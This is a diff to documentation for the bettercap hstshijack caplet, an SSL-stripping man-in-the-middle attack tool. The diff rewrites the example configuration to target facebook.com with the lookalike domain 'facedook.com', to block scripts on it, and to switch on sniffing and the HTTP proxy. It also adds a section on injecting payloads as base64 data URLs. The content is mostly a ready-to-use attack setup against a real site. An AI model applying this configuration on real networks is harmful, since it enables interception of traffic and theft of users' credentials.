@@ -5,21 +5,21 @@
 ### Caplet
 
 ```sh
-set hstshijack.log             hstshijack/ssl.log
-set hstshijack.payload         hstshijack/payloads/hstshijack-payload.js
+set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.payload         /usr/local/share/bettercap/caplets/hstshijack/payloads/hstshijack-payload.js
 set hstshijack.ignore          *
-set hstshijack.targets         blockchain.info,*.blockchain.info
-set hstshijack.replacements    blockchian.info,*.blockchian.info
-#set hstshijack.blockscripts    domain.com,*.domain.com
-set hstshijack.custompayloads  *:hstshijack/payloads/sslstrip.js
+set hstshijack.targets         facebook.com,*.facebook.com
+set hstshijack.replacements    facedook.com,*.facedook.com
+set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.obfuscate       false
+set hstshijack.encode          true
+set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
 
-set http.proxy.script  hstshijack/hstshijack.js
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
 #set net.sniff.output   hstshijack0001.pcap
 set net.sniff.verbose  false
-set dns.spoof.all      true
-net.sniff    on
-dns.spoof    on
-http.proxy   on
+net.sniff   on
+http.proxy  on
 ```
 
 ### Core payload
@@ -68,6 +68,12 @@ function jfIleNwmKoa() {
 
 jfIleNwmKoa()
 ```
+
+### Encoding
+
+Payloads can be injected in HTML documents using base64 encoded data URLs.
+
+To enable payload encoding, set `hstshijack.encode` to `true`.
 
 ### Silent callbacks
 
